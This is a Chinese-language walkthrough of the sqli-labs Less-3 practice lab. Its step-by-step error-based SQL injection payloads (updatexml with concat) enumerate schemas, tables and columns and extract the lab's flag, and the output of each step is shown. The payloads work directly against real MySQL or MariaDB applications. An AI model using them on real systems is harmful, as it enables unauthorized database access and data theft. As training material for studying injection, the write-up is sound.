题目：sqli-labs less3

首先测试出题目为字符型注入，接下来测试注释能否生效，在url后加入`?id=1'--+`，访问后，输出如下
```
Welcome    Dhakkan
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1
```
因此可知无法使用union注入，进行报错注入测试，在url后加入`?id=0' or updatexml(1,concat(0x7e,(SELECT Group_concat(schema_name) FROM information_schema.schemata),0x7e),1) or '1`，访问后，输出如下
```
Welcome    Dhakkan
XPATH syntax error: '~ctftraining,information_schema,'
```
接下来修改updatexml的第二个参数，查询ctftraining库中的表，在url后加入`id=0' or updatexml(1,concat(0x7e,(SELECT Group_concat(table_name) FROM information_schema.tables where table_schema='ctftraining'),0x7e),1) or '1`，访问后，输出如下
```
Welcome    Dhakkan
XPATH syntax error: '~flag,news,users~'
```
查询`flag`表的字段名，在url后加入`?id=0' or updatexml(1,concat(0x7e,(SELECT Group_concat(column_name) FROM information_schema.columns where table_schema='ctftraining' and table_name='flag'),0x7e),1) or '1`，访问后，输出如下
```
Welcome    Dhakkan
XPATH syntax error: '~flag~'
```
最后查`flag`表，在url后加入`?id=0' or updatexml(1,concat(0x7e,(SELECT Group_concat(flag) FROM ctftraining.flag),0x7e),1) or '1`，访问后，得到`flag`
```
Welcome    Dhakkan
XPATH syntax error: '~flag{92b3b749-0ac6-4674-bc04-91'
```
可以看出flag并没有显示完全，因此对flag字符串进行截断，在url后加入`?id=0' or updatexml(1,concat(0x7e,Right((SELECT Group_concat(flag) FROM ctftraining.flag),25),0x7e),1) or '1`，访问后，得到`flag`的后半段
```
Welcome    Dhakkan
XPATH syntax error: '~6-4674-bc04-916b8d91ab4b}~'
```
`flag`:`flag{92b3b749-0ac6-4674-bc04-916b8d91ab4b}`